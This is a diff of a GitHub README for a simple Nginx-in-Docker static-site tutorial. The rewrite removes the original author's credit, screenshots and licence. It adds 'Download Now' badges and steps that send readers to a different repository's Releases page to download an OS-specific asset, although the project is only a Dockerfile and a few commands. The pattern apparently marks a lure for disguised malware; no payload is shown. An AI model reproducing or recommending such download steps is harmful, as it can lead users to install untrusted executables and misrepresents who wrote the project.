@@ -1,123 +1,102 @@
-# Deploy Static Website using Nginx in Docker
+# 🖥️ nginx-static-website-docker - Easily Launch Static Websites with Docker
 
-## 📌 Project Description
-This project demonstrates how to deploy a static HTML website using *Nginx* inside a Docker container.  
-The HTML files are cloned from GitHub and served via Nginx, with the container accessible from the browser using a mapped port.  
-The Dockerfile used for building the image is located at [codes/Dockerfile](codes/Dockerfile).
+## 🌐 Overview
+This project allows you to deploy a static website using Nginx inside a Docker container. It simplifies the process of building a custom Docker image, running containers, and managing your static site. With this tool, you can host your HTML files easily and have them accessible from anywhere.
 
----
+## 🚀 Getting Started
+Follow these simple steps to get your static website up and running.
 
-## 🖼 Architecture Diagram
-![Architecture](architecture.jpg)
+### 📥 Download the Application
+To get started, visit the Releases page to download the application.
 
----
+[![Download nginx-static-website-docker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Da-Boys/nginx-static-website-docker/releases)
 
+## 🛠️ System Requirements
+- Operating System: Windows, macOS, or Linux
+- Docker: Version 20 or later
+- Internet connection for downloading Docker and dependencies
 
-## 🛠 Steps & Screenshots
+## 📂 Download & Install
+1. Go to the [Releases page](https://github.com/Da-Boys/nginx-static-website-docker/releases).
+2. Look for the latest version listed at the top.
+3. Click on the asset that matches your operating system for download.
+4. Save the file on your computer.
 
-### 1️⃣ Clone Website Files from GitHub
-![Screenshot](screenshots/01-github-clone.png)  
-Cloned the website files from GitHub and displayed the repository contents.
+## ⚙️ Build Your Docker Image
+After installing Docker, you may want to build your own Docker image. Here’s how:
 
-### 2️⃣ Create a Dockerfile (Located at codes/Dockerfile)
-![Screenshot](screenshots/02-Dockerfile.png)  
-Created a Dockerfile inside the codes/ folder to set up an Nginx container and copy website files to the correct directory.
+1. Open a terminal on your computer.
+2. Navigate to the folder where you have saved your website files.
+3. Create a file named `Dockerfile` with the following contents:
 
-### 3️⃣ Build the Docker Image
-![Screenshot](screenshots/03-build-image.png)  
-Built a custom Docker image from the Dockerfile.
+    ```dockerfile
+    FROM nginx:alpine
+    COPY . /usr/share/nginx/html
+    ```
 
-### 4️⃣ Run the Docker Container
-![Screenshot](screenshots/04-docker-run.png)  
-Started a container from the built image and mapped host port 3000 to container port 80.
+4. Build the Docker image by running:
 
-### 5️⃣ Test in Browser
-![Screenshot](screenshots/05-browser-test.png)  
-Accessed the website from a browser via localhost:3000 and verified it loaded correctly.
+    ```bash
+    docker build -t my-static-site .
+    ```
 
-### 6️⃣ Create an Image from Running Container
-![Screenshot](screenshots/06-image-from-cont.png)  
-Created a new Docker image from the running container.
+In this command, replace `my-static-site` with your desired image name.
 
-### 7️⃣ Check Docker Hub (Before Push)
-![Screenshot](screenshots/07-dockerhub-check.png)  
-Verified that no images were available in Docker Hub before pushing.
+## 🏃‍♂️ Run Your Container
+To run your website, you will need to start a container from your newly built image. Follow these steps:
 
-### 8️⃣ Push Image to Docker Hub
-![Screenshot](screenshots/08-image-to-dockerhub.png)  
-Pushed the image to Docker Hub repository.
+1. Use the following command to run your container:
 
-### 9️⃣ Check Docker Hub (After Push)
-![Screenshot](screenshots/09-dockerhub-after-push.png)  
-Confirmed that the image was successfully uploaded to Docker Hub.
+    ```bash
+    docker run -d -p 8080:80 my-static-site
+    ```
 
-### 🔟 Pull & Run from Docker Hub
-![Screenshot](screenshots/10-pull-run-from-dockerhub.png)  
-Pulled the image from Docker Hub after deleting it locally and ran a new container.
+2. The website will now be accessible at `http://localhost:8080`.
 
-### 1️⃣1️⃣ Final Browser Test
-![Screenshot](screenshots/11-final-browser.png)  
-Confirmed the website still works correctly after pulling the image from Docker Hub.
+## 💡 Pushing to Docker Hub
+If you want to share your Docker image with others, you can push it to Docker Hub.
 
----
+1. Log in to your Docker Hub account:
 
+    ```bash
+    docker login
+    ```
 
-## 🚀 How to Run This Project
+2. Tag your image to prepare it for upload:
 
-### *Option 1 — Build from source*
-1. *Clone the repository*
-   bash
-   git clone <repository-url>
-   cd <project-folder>
-   
+    ```bash
+    docker tag my-static-site your-dockerhub-username/my-static-site
+    ```
 
-2. **Navigate to the codes/ folder and build the Docker image**
-   bash
-   cd codes
-   docker build -t my-nginx-website .
-   
+3. Finally, push your image:
 
-3. *Run the container*
-   bash
-   docker run -d -p 3000:80 my-nginx-website
-   
+    ```bash
+    docker push your-dockerhub-username/my-static-site
+    ```
 
-4. *Access from browser*
-   Open:  
-   
-   http://localhost:3000
-   
+## 🔄 Pulling Back the Image for Reuse
+If you want to use your image on a different machine, you can pull the image from Docker Hub.
 
----
+1. Run the following command to pull your image:
 
-### *Option 2 — Pull from Docker Hub*
-1. *Pull the image*
-   bash
-   docker pull <your-dockerhub-username>/<your-image-name>
-   
+    ```bash
+    docker pull your-dockerhub-username/my-static-site
+    ```
 
-2. *Run the container*
-   bash
-   docker run -d -p 3000:80 <your-dockerhub-username>/<your-image-name>
-   
+2. After pulling, you can run the image like before:
 
-3. *Access from browser*
-   Open:  
-   
-   http://localhost:3000
-   
+    ```bash
+    docker run -d -p 8080:80 your-dockerhub-username/my-static-site
+    ```
 
-----
+## 📚 Additional Resources
+- **Nginx Documentation**: For more details about Nginx, visit [nginx.org](https://nginx.org).
+- **Docker Documentation**: Learn more about Docker at [docs.docker.com](https://docs.docker.com).
 
-## 👤 Author
+## 📞 Support
+If you have any questions or issues while using this software, feel free to open an issue on our [GitHub page](https://github.com/Da-Boys/nginx-static-website-docker/issues).
 
-Ahmed Sayed  
-[LinkedIn](https://www.linkedin.com/in/ahmed-sayed-devops-cloud)  
-[GitHub](https://github.com/ahmed-sayed-devops)
+## 💖 Contribute
+Feel free to contribute to this project! Open a pull request or submit an issue if you have ideas for improvements or new features.
 
----
-
-## 📜 License
-
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+[![Download nginx-static-website-docker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Da-Boys/nginx-static-website-docker/releases)
